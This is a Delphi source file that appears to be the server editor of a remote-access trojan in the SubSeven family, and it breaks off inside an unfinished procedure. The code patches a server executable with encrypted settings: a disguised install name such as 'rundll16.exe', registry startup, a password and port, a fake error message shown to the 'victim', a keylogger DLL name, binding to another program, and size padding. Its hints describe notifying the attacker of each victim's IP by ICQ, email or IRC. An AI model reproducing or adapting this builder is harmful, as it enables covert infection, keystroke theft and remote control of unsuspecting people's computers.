unit EditServerUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, Mask, ToolEdit, ComCtrls,LZExpand, ExtCtrls, Psock, NMsmtp;

type
  TForm1 = class(TForm)
    Button1: TButton;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    Edit4: TEdit;
    Label1: TLabel;
    Edit5: TEdit;
    FilenameEdit1: TFilenameEdit;
    FilenameEdit2: TFilenameEdit;
    Label2: TLabel;
    Button2: TButton;
    StatusBar: TStatusBar;
    Button3: TButton;
    CheckBox6: TCheckBox;
    Edit6: TEdit;
    Label3: TLabel;
    Label4: TLabel;
    Edit8: TEdit;
    CheckBox7: TCheckBox;
    Edit9: TEdit;
    CheckBox8: TCheckBox;
    Edit10: TEdit;
    Button4: TButton;
    RadioGroup1: TRadioGroup;
    CheckBox9: TCheckBox;
    Edit11: TEdit;
    Label5: TLabel;
    Edit12: TEdit;
    Label6: TLabel;
    Edit13: TEdit;
    Bevel1: TBevel;
    Bevel2: TBevel;
    Bevel3: TBevel;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    CheckBox10: TCheckBox;
    Button8: TButton;
    Shape1: TShape;
    CheckBox11: TCheckBox;
    Edit14: TEdit;
    Button9: TButton;
    email: TNMSMTP;
    Edit7: TComboBox;
    procedure Button1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FilenameEdit2Change(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure CheckBox6Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure CheckBox9MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FilenameEdit2MouseMove(Sender: TObject; Shift: TShiftState;
      X, Y: Integer);
    procedure Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit3MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit4MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure FilenameEdit1MouseMove(Sender: TObject; Shift: TShiftState;
      X, Y: Integer);
    procedure Edit9MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit10MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit6MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit7MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit8MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit11MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit12MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit13MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CheckBox9Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button8MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit14MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button9MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button9Click(Sender: TObject);
    procedure Button6MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
  private
    function ExePatched(filename:string): integer;
    procedure CheckThem;
    { Private declarations }
  public
    { Public declarations }
  end;

const MainPass=7827;
      InfoSize=234;
      InfoSize2=153+50;
var
  Form1: TForm1;

implementation

uses changeicon, ES_messageunit, EditServer_Sizes;

{$R *.DFM}

function FileCopy(src,dest:String):Boolean;
var s, d: TOFStruct;
    fs, fd: Integer;
    fnSrc, fnDest: PChar;
begin
      src:=src + #0;dest:=dest + #0;
      fnSrc:=@src[1];
      fnDest:=@dest[1];
      fs := LZOpenFile( fnSrc, s, OF_READ );
      fd := LZOpenFile( fnDest, d, OF_CREATE );
      if LZCopy( fs, fd ) < 0 then
         Result:=False else Result:=True;
      LZClose( fs );
      LZClose( fd );
end;

function Decrypt(ce:string):string;var x,i:Integer;Text,PW:String;
begin
 Text:=ce;  PW:=IntToStr(MainPass);  x:=0; // initialize count
 for i:=0 to length(Text) do begin Text[i]:=Chr(Ord(Text[i])-Ord(PW[x]));
 Inc(x);if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

function Encrypt(ce:string):string;var x,i:Integer;Text,PW:String;
begin Text:=ce;PW:=IntToStr(MainPass);x:=0; // initialize count
 for i:=0 to length(text) do begin Text[i]:=Chr(Ord(Text[i])+Ord(PW[x]));Inc(x);
 if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

procedure TForm1.Button1Click(Sender: TObject);
type _size=packed record
      s:string[InfoSize];
     end;
type _size2=packed record
      s:string[InfoSize2];
     end;
const iseeku:String[18]='0'+'00'+'               ';      // 3+15
      myname:String[23]='0'+'00'+'                    '; // 3+20
      portno:String[13]='0'+'00'+'          ';           // 3+10
      passwo:String[23]='0'+'00'+'                    '; // 3+20
      sizexe:String[23]='0'+'00'+'                    '; // 3+20
      emsmtp:String[33]='1'+'13'+'                              '; // 3+30
      emuser:String[12]=    '04'+'          ';                     //   12
      emtoad:String[33]='1'+'13'+'                              '; // 3+30
      exenam:String[23]='1'+'12'+'rundll16.exe        ';           // 3+20
      regnam:String[33]='1'+'13'+'Registry Scan                 '; // 3+30

      startm:String[1 ]='3';                                       // 1
      ircsrv:String[33]='1'+'07'+'pai duh                       '; // 3+30
      ircnck:String[23]='0'+'00'+'                    ';           // 3+20
      ircprt:String[8 ]='0'+'04'+'7000 ';                          // 3+5
      msgicn:String[1 ]='0';                                       // 1
      msgbut:String[1 ]='0';                                       // 1
      msgtit:String[33]='0'+'00'+'                              '; // 3+30
      msgtxt:String[53]='0'+'00'+'                                                  '; // 3+50
      dlladd:String[13]='0'+'00'+'          ';                     //   13
      dllnam:String[24]='0'+'00'+'                     ';          // 3+21
      addsiz:String[13]='0'+'00'+'          ';                     //   13

var f:file;
    size:_size;
    size2:_size2;
    exe,strm:TFileStream;
    StrLen,MarimeExe:string;
    len,i,seekat,_i:integer;
    doitnow:boolean;
    ii:Char;
begin
 iseeku:='0'+'00'+'               ';
 myname:='0'+'00'+'                    ';
 portno:='0'+'00'+'          ';
 passwo:='0'+'00'+'                    ';
 sizexe:='0'+'00'+'                    ';
 emsmtp:='0'+'00'+'                              ';
 emuser:=    '00'+'          ';
 emtoad:='0'+'00'+'                              ';
 exenam:='0'+'00'+'                    ';
 regnam:='0'+'00'+'                              ';

 startm:='3';
 ircsrv:='0'+'00'+'                              ';
 ircnck:='0'+'00'+'                    ';
 ircprt:='0'+'00'+'     ';
 msgicn:='0';
 msgbut:='0';
 msgtit:='0'+'00'+'                              ';
 msgtxt:='0'+'00'+'                                                  ';
 dlladd:='0'+'00'+'          ';
 dllnam:='0'+'00'+'                     ';
 addsiz:='0'+'00'+'          ';

 if (not FileExists(FileNameEdit2.FileName)) then
  begin
   ShowMessage('hello??? i need a valid SERVER.EXE, what the hell?');
   exit;
  end;
 seekat:=ExePatched(FileNameEdit2.FileName);
 doitnow:=false;
 if ((CheckBox5.Checked) and (FileExists(FileNameEdit1.FileName))) then doitnow:=true;
 if ((CheckBox5.Checked) and (not FileExists(FileNameEdit1.FileName)) and (copy(FileNameEdit1.FileName,1,3)<>'<pa')) then
  begin
   ShowMessage('maybe you wanna specify a VALID exe file to patch? i can''t find '+FileNameEdit1.FileName);
   exit;
  end;
 if ((Edit4.Text<>Edit5.Text) and (CheckBox4.Checked)) then begin
  showmessage('oh oh. you got two different passwords in there! make up your mind!');
  exit;
 end;
 StatusBar.Panels[0].Text:='patching...';
 filecopy(FileNameEdit2.FileName,FileNameEdit2.FileName+'.BAK');
 if CheckBox1.Checked then
  begin
   iseeku[1]:='1';len:=Length(Edit1.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   iseeku[2]:=strLen[1];
   iseeku[3]:=strlen[2];
   for i:=1 to len do iseeku[3+i]:=Edit1.Text[i];
  end;
 if CheckBox2.Checked then
  begin
   myname[1]:='1';len:=Length(Edit2.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   myname[2]:=strLen[1];
   myname[3]:=strlen[2];
   for i:=1 to len do myname[3+i]:=Edit2.Text[i];
  end;
 if CheckBox3.Checked then
  begin
   portno[1]:='1';len:=Length(Edit3.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   portno[2]:=strLen[1];
   portno[3]:=strlen[2];
   for i:=1 to len do portno[3+i]:=Edit3.Text[i];
  end;
 if CheckBox4.Checked then
  begin
   passwo[1]:='1';len:=Length(Edit4.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   passwo[2]:=strLen[1];
   passwo[3]:=strlen[2];
   for i:=1 to len do passwo[3+i]:=Edit4.Text[i];
  end;
 if CheckBox7.Checked then
  begin
   exenam[1]:='1';len:=Length(Edit9.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   exenam[2]:=strLen[1];
   exenam[3]:=strlen[2];
   for i:=1 to len do exenam[3+i]:=Edit9.Text[i];
  end;
 if CheckBox11.Checked then
  begin
   dllnam[1]:='1';len:=Length(Edit14.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   dllnam[2]:=strLen[1];
   dllnam[3]:=strlen[2];
   for i:=1 to len do dllnam[3+i]:=Edit14.Text[i];
  end;
 if ES_Sizes.CheckBox2.Checked then
  begin
   dlladd[1]:='1';len:=Length(IntToStr(ES_Sizes.SpinEdit2.Value));if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   dlladd[2]:=strLen[1];
   dlladd[3]:=strlen[2];
   for i:=1 to len do dlladd[3+i]:=IntToStr(ES_Sizes.SpinEdit2.Value)[i];
  end;
 if ES_Sizes.CheckBox1.Checked then
  begin
   addsiz[1]:='1';len:=Length(IntToStr(ES_Sizes.SpinEdit1.Value));if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   addsiz[2]:=strLen[1];
   addsiz[3]:=strlen[2];
   for i:=1 to len do addsiz[3+i]:=IntToStr(ES_Sizes.SpinEdit1.Value)[i];
  end;
 if CheckBox8.Checked then
  begin
   regnam[1]:='1';len:=Length(Edit10.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   regnam[2]:=strLen[1];
   regnam[3]:=strlen[2];
   for i:=1 to len do regnam[3+i]:=Edit10.Text[i];
  end;

 if CheckBox9.Checked then
  begin
   ircsrv[1]:='1';len:=Length(Edit12.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   ircsrv[2]:=strLen[1];
   ircsrv[3]:=strlen[2];
   for i:=1 to len do ircsrv[3+i]:=Edit12.Text[i];
   ircnck[1]:='1';len:=Length(Edit11.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   ircnck[2]:=strLen[1];
   ircnck[3]:=strlen[2];
   for i:=1 to len do ircnck[3+i]:=Edit11.Text[i];
   ircprt[1]:='1';len:=Length(Edit13.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   ircprt[2]:=strLen[1];
   ircprt[3]:=strlen[2];
   for i:=1 to len do ircprt[3+i]:=Edit13.Text[i];
  end;

 if CheckBox10.Checked then
  begin
   msgicn:=IntToStr(MessageManager.CIcon);
   msgbut:=IntToStr(MessageManager.RadioGroup1.ItemIndex);
   msgtit[1]:='1';len:=Length(MessageManager.Edit1.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   msgtit[2]:=strLen[1];
   msgtit[3]:=strlen[2];
   for i:=1 to len do msgtit[3+i]:=MessageManager.Edit1.Text[i];
   msgtxt[1]:='1';len:=Length(MessageManager.Edit2.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   msgtxt[2]:=strLen[1];
   msgtxt[3]:=strlen[2];
   for i:=1 to len do msgtxt[3+i]:=MessageManager.Edit2.Text[i];
  end;

 startm:=IntToStr(RadioGroup1.ItemIndex);

 if CheckBox6.Checked then
  begin
   EMtoAd[1]:='1';len:=Length(Edit6.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   EMtoAd[2]:=strLen[1];
   EMtoAd[3]:=strlen[2];
   for i:=1 to len do EMtoAd[3+i]:=Edit6.Text[i];
   EMsmtp[1]:='1';len:=Length(Edit7.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   EMsmtp[2]:=strLen[1];
   EMsmtp[3]:=strlen[2];
   for i:=1 to len do EMsmtp[3+i]:=Edit7.Text[i];
   EMuser[1]:='1';len:=Length(Edit8.Text);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   EMuser[1]:=strLen[1];
   EMuser[2]:=strlen[2];
   for i:=1 to len do EMuser[2+i]:=Edit8.Text[i];
  end;
 if (copy(FileNameEdit1.FileName,1,3)<>'<pa') then
  begin
   sizexe[1]:='1';
   MarimeExe:=IntToStr(SeekAt);
   len:=Length(MarimeExe);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
   sizexe[2]:=strLen[1];
   sizexe[3]:=strlen[2];
   for i:=1 to len do sizexe[3+i]:=MarimeExe[i];
   seekat:=-1;
  end;

 if ((seekat<>-1) and (not CheckBox5.Checked)) then
 begin
   if MessageDlg('the server is currently binded with an EXE file ['+inttostr(seekat)+' bytes]. do you want to remove the exe? ',
    mtConfirmation, [mbYes, mbNo], 0) = mrNo then
    begin
     sizexe[1]:='1';
     MarimeExe:=IntToStr(SeekAt);
     len:=Length(MarimeExe);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
     sizexe[2]:=strLen[1];
     sizexe[3]:=strlen[2];
     for i:=1 to len do sizexe[3+i]:=MarimeExe[i];
     seekat:=-1;
    end else sizexe:='0'+'00'+'                    ';
 end;

 if ((seekat<>-1) and (Checkbox5.Checked) and (not doitnow)) then seekat:=-1;
 if ((seekat<>-1) and (CheckBox5.Checked)) then
  begin
     sizexe[1]:='1';
     MarimeExe:=IntToStr(SeekAt);
     len:=Length(MarimeExe);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
     sizexe[2]:=strLen[1];
     sizexe[3]:=strlen[2];
     for i:=1 to len do sizexe[3+i]:=MarimeExe[i];
     seekat:=-1;
  end else sizexe:='0'+'00'+'                    ';

 assignfile(f,FileNameEdit2.FileName);
 reset(f,1);
 if seekat=-1 then seek(f,filesize(f)-InfoSize-InfoSize2-2)
  else seek(f,filesize(f)-InfoSize-InfoSize2-2-seekat);
 truncate(f);
 closefile(f);

 if ES_Sizes.CheckBox1.Checked then
 begin
   assignfile(f,FileNameEdit2.FileName);
   reset(f,1);
   seek(f,filesize(f));
  for i:=1 to ES_Sizes.SpinEdit1.Value do
  begin
   ii:=Chr(Random(120)+130);
   _i:=1;
   blockwrite(f,ii,_i);
  end;
   closefile(f);
 end;

 if (doitnow) then begin
  exe:=TFileStream.Create(FileNameEdit1.FileName,fmOpenRead);
  strm:=TFileStream.Create(FileNameEdit2.FileName,fmOpenReadWrite);
  strm.seek(0,soFromEnd);
  strm.copyfrom(exe,exe.size);
  MarimeExe:=IntToStr(exe.size);
  strm.free;
  exe.free;
  sizexe[1]:='1';
  len:=Length(MarimeExe);if len>=10 then strLen:=IntToStr(len) else strLen:='0'+IntToStr(len);
  sizexe[2]:=strLen[1];
  sizexe[3]:=strlen[2];
  for i:=1 to len do sizexe[3+i]:=MarimeExe[i];
 end;

 assignfile(f,FileNameEdit2.FileName);
 reset(f,1);
 size.s:=iseeku+myname+portno+passwo+sizexe+emsmtp+emuser+emtoad+exenam+regnam;
 size.s:=Encrypt(size.s);
 seek(f,filesize(f));
 blockwrite(f,size,sizeof(size));
 closefile(f);

 assignfile(f,FileNameEdit2.FileName);
 reset(f,1);
 size2.s:=startm+ircsrv+ircnck+ircprt+msgicn+msgbut+msgtit+msgtxt+dlladd+dllnam+addsiz;
 size2.s:=Encrypt(size2.s);
 seek(f,filesize(f));
 blockwrite(f,size2,sizeof(size2));
 closefile(f);

 StatusBar.Panels[0].Text:='patched successfully! [backup filename: '+FileNameEdit2.FileName+'.BAK'+']';
 showmessage('patched successfully! if you want to restore the original file, rename ['+FileNameEdit2.FileName+'.BAK] to any other EXE filename!');
end;

procedure TForm1.FormShow(Sender: TObject);
begin
 StatusBar.Panels[0].Text:='pick server.exe and then click "read current settings"';
end;

procedure TForm1.FilenameEdit2Change(Sender: TObject);
begin
 StatusBar.Panels[0].Text:='click on "read current settings" to see the server''s settings';
end;

procedure TForm1.Button2Click(Sender: TObject);
var _f:TOfStruct;
    f:integer;
    _fis:string;
    fis:PChar;
    buf:array[1..InfoSize] of char;
    buf2:array[1..InfoSize2] of char;
    ReadString, ReadString2:String;
    i,tmp:integer;
    data:array[1..21] of string[53];
begin
 if (Not FileExists(FileNameEdit2.FileName)) then
  begin
   ShowMessage('what the hell? i can''t find: '+FileNameEdit2.FileName);
   exit;
  end;
 StatusBar.Panels[0].Text:='reading info...';
 _fis:=FileNameEdit2.FileName+#0;
 fis:=@_fis[1];
 f:=LZOpenFile(fis, _f, OF_READ );
 LZSeek(f,-InfoSize2,2);
 LZRead(f,@buf2,InfoSize2);
 LZSeek(f,-InfoSize-InfoSize2-1,2);
 LZRead(f,@buf,InfoSize);
 LZClose(f);
 ReadString:='';
 ReadString2:='';
 for i:=1 to InfoSize do ReadString:=ReadString+buf[i];
 for i:=1 to InfoSize2 do ReadString2:=ReadString2+buf2[i];
 ReadString:=Decrypt(ReadString);
 ReadString2:=Decrypt(ReadString2);
 data[1]:=copy(ReadString,1,18);
 data[2]:=copy(ReadString,19,23);
 data[3]:=copy(ReadString,42,13);
 data[4]:=copy(ReadString,55,23);
 data[5]:=copy(ReadString,78,23);
 data[7]:=copy(ReadString,101,33);
 data[8]:=copy(ReadString,134,12);
 data[6]:=copy(ReadString,146,33);
 data[9]:=copy(ReadString,179,23);
 data[10]:=copy(ReadString,202,33);

 data[11]:=copy(ReadString2,1,1);
 data[12]:=copy(ReadString2,2,33);
 data[13]:=copy(ReadString2,35,23);
 data[14]:=copy(ReadString2,58,8);

 data[15]:=copy(ReadString2,66,1);
 data[16]:=copy(ReadString2,67,1);
 data[17]:=copy(ReadString2,68,33);
 data[18]:=copy(ReadString2,101,53);

 data[19]:=copy(ReadString2,154,13);
 data[20]:=copy(ReadString2,167,24);
 data[21]:=copy(ReadString2,191,13);

{this displays the data}
 i:=1;if data[i][1]='1' then CheckBox1.Checked:=True else CheckBox1.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit1.Text:=copy(data[i],4,tmp);
 i:=2;if data[i][1]='1' then CheckBox2.Checked:=True else CheckBox2.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit2.Text:=copy(data[i],4,tmp);
 i:=3;if data[i][1]='1' then CheckBox3.Checked:=True else CheckBox3.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit3.Text:=copy(data[i],4,tmp);
 i:=4;if data[i][1]='1' then CheckBox4.Checked:=True else CheckBox4.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit4.Text:=copy(data[i],4,tmp);Edit5.Text:=Edit4.Text;
 i:=5;if data[i][1]='1' then begin CheckBox5.Checked:=True;
 tmp:=StrToInt(copy(data[i],2,2));FileNameEdit1.Text:='<packed with '+copy(data[i],4,tmp)+' bytes>';
 end else begin FileNameEdit1.Text:='';CheckBox5.Checked:=False; end;
 i:=6;if data[i][1]='1' then CheckBox6.Checked:=True else CheckBox6.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit6.Text:=copy(data[i],4,tmp);
 i:=7;tmp:=StrToInt(copy(data[i],2,2));Edit7.Text:=copy(data[i],4,tmp);
 i:=8;tmp:=StrToInt(copy(data[i],1,2));Edit8.Text:=copy(data[i],3,tmp);
 i:=9;if data[i][1]='1' then CheckBox7.Checked:=True else CheckBox7.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit9.Text:=copy(data[i],4,tmp);
 i:=10;if data[i][1]='1' then CheckBox8.Checked:=True else CheckBox8.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit10.Text:=copy(data[i],4,tmp);
 i:=11;RadioGroup1.ItemIndex:=StrToInt(data[i][1]);
 i:=12;if data[i][1]='1' then CheckBox9.Checked:=True else CheckBox9.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));Edit12.Text:=copy(data[i],4,tmp);
 i:=13;tmp:=StrToInt(copy(data[i],2,2));Edit11.Text:=copy(data[i],4,tmp);
 i:=14;tmp:=StrToInt(copy(data[i],2,2));Edit13.Text:=copy(data[i],4,tmp);

 i:=15;MessageManager.CIcon:=StrToInt(data[i][1]);
 i:=16;MessageManager.RadioGroup1.ItemIndex:=StrToInt(data[i][1]);
 i:=17;if data[i][1]='1' then CheckBox10.Checked:=True else CheckBox10.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));MessageManager.Edit1.Text:=copy(data[i],4,tmp);
 i:=18;tmp:=StrToInt(copy(data[i],2,2));MessageManager.Edit2.Text:=copy(data[i],4,tmp);


 i:=19;if data[i][1]='1' then ES_Sizes.CheckBox2.Checked:=True else ES_Sizes.CheckBox2.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));try ES_Sizes.SpinEdit2.Value:=StrToInt(copy(data[i],4,tmp));except end;
 i:=20;if data[i][1]='1' then CheckBox11.Checked:=True else CheckBox11.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));try Edit14.Text:=copy(data[i],4,tmp);except end;
 i:=21;if data[i][1]='1' then ES_Sizes.CheckBox1.Checked:=True else ES_Sizes.CheckBox1.Checked:=False;
 tmp:=StrToInt(copy(data[i],2,2));try ES_Sizes.SpinEdit1.Value:=StrToInt(copy(data[i],4,tmp));except end;

 CheckThem;
 CheckBox6Click(sender);
 StatusBar.Panels[0].Text:='done.';
end;

function TForm1.ExePatched(filename:string):integer;
var _f:TOfStruct;
    f:integer;
    _fis:string;
    fis:PChar;
    buf:array[1..InfoSize] of char;
    ReadString:String;
    i,tmp:integer;
    data:array[1..8] of string[53];
begin
 _fis:=FileName+#0;
 fis:=@_fis[1];
 f:=LZOpenFile(fis, _f, OF_READ );
 LZSeek(f,-InfoSize-InfoSize2-1,2);
{ LZSeek(f,-InfoSize,2);}
 LZRead(f,@buf,InfoSize);
 LZClose(f);
 for i:=1 to InfoSize do ReadString:=ReadString+buf[i];
 ReadString:=Decrypt(ReadString);
 data[5]:=copy(ReadString,78,23);
 if data[5][1]='1' then begin
  tmp:=StrToInt(copy(data[5],2,2));result:=StrToInt(copy(data[5],4,tmp));
 end else result:=-1;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
 close;
end;

procedure TForm1.CheckBox6Click(Sender: TObject);
var b:boolean;
begin
 if CheckBox6.Checked then b:=true else b:=false;
 Label3.Enabled:=b;
 Label4.Enabled:=b;
 Edit7.Enabled:=b;
 Edit8.Enabled:=b;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
 form2.showmodal;
end;

procedure TForm1.CheckThem;
begin
if CheckBox9.Checked then begin
 edit12.enabled:=true;
 edit13.enabled:=true;
 label5.enabled:=true;
 label6.enabled:=true;
end else begin
 edit12.enabled:=false;
 edit13.enabled:=false;
 label5.enabled:=false;
 label6.enabled:=false;
end;
end;

procedure TForm1.CheckBox9MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 CheckBox9.Hint:='ok, this is probably the easiest way to notify. for server, only DALNET or EFFNET servers work. you can notify to a nick or a channel [they differ by #]. also, a random nick will be picked for the victims.';
end;

procedure TForm1.FilenameEdit2MouseMove(Sender: TObject;
  Shift: TShiftState; X, Y: Integer);
begin
 StatusBar.Panels[0].Text:='click on the folder in the right side to open server.exe';
end;

procedure TForm1.Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='click here to read the settings from the specified file';
end;

procedure TForm1.Edit3MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the port# that the server will run on';
end;

procedure TForm1.Edit4MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the password of the server';
end;

procedure TForm1.FilenameEdit1MouseMove(Sender: TObject;
  Shift: TShiftState; X, Y: Integer);
begin
 StatusBar.Panels[0].Text:='spcify an exe file to be binded with the server';
end;

procedure TForm1.Edit9MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='this will be the name of the server on the victim''s computer';
end;

procedure TForm1.Edit10MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the registry key name [if registry is used for startup]';
end;

procedure TForm1.Edit2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='just a simple name that will be included in the online notification';
end;

procedure TForm1.Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='your icq number. you''ll receive the victim''s IP at that number'; 
end;

procedure TForm1.Edit6MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='your e-mail. you''ll receive and email whenever the victim connects to the net';
end;

procedure TForm1.Edit7MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the mail server that will be used for the email';
end;

procedure TForm1.Edit8MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the user id for the mail server';
end;

procedure TForm1.Edit11MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the channel [eg.#subseven] or nickname [eg.mobman] that will receive the notify on IRC';
end;

procedure TForm1.Edit12MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the irc server. it ONLY works on DALNET and EFFNET servers';
end;

procedure TForm1.Edit13MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the port of the irc server';
end;

procedure TForm1.CheckBox9Click(Sender: TObject);
begin
 CheckThem;
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
 showmessage('ok, here we go:'#13#10'find a server on mIRC by going to: FILE - SETUP'#13#10'where the server is, pick a DALNET or EFFNET server. then, click on EDIT'#13#10'put the "IRC server" in the server location and one of the "port(s)" in the port location.'#13#10'    >>> more');
 showmessage('then, on the notify to: put your nickname or a channel where you''ll wait for notifications'#13#10'then simply connect to that server with mirc, and wait'#13#10'that''s about it.');
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
 StatusBar.Panels[1].Text:='sending email...';
  email.ClearParams := TRUE;
  email.Host := Edit7.Text;
  email.Port := 25;
  email.UserID:=Edit8.Text;
 try
 StatusBar.Panels[1].Text:='connecting to server...';
  email.Connect;
 except
  StatusBar.Panels[1].Text:='error connecting to server';
  showmessage('error connecting to server');
  exit;
 end;
  with email.postmessage do begin
   FromAddress := 'none!';
   FromName := 'EditServer';
   ToAddress.Add(Edit6.Text);
   ToCarbonCopy.Add('');
   ToBlindCarbonCopy.Add('');
   Body.Add('if this email gets to you, then the annonymous email server works! you can safely use it for your victims.');
   Subject := 'it works!';
   LocalProgram := 'sssmtp';
   email.ClearParams := TRUE;
  end;
 try
 StatusBar.Panels[1].Text:='sending email info...';
  email.SendMail;
 except
  StatusBar.Panels[1].Text:='error sending email';
  showmessage('error sending email');
  exit;
 end;
 try
  StatusBar.Panels[1].Text:='disconnecting...';
  email.Disconnect;
 except
  StatusBar.Panels[1].Text:='error encountered';
  showmessage('error encountered');
  exit;
 end;
 showmessage('email sent successfully. check your email to see if the email arrived');
 StatusBar.Panels[1].Text:='done!';
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
 showmessage('if you don''t know what these do, then don''t change anything. all of the methods work fine');
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
 messagemanager.showmodal;
end;

procedure TForm1.Button8MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='configure the FAKE error message that the victim will see when he/she runs the server for the first time.';
end;

procedure TForm1.Edit14MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='the dll used for the keylogger will be saved with this name';
end;

procedure TForm1.Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='click here to apply the new settings to the server';
end;

procedure TForm1.Button9MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='click here to change the size of the server files';
end;

procedure TForm1.Button9Click(Sender: TObject);
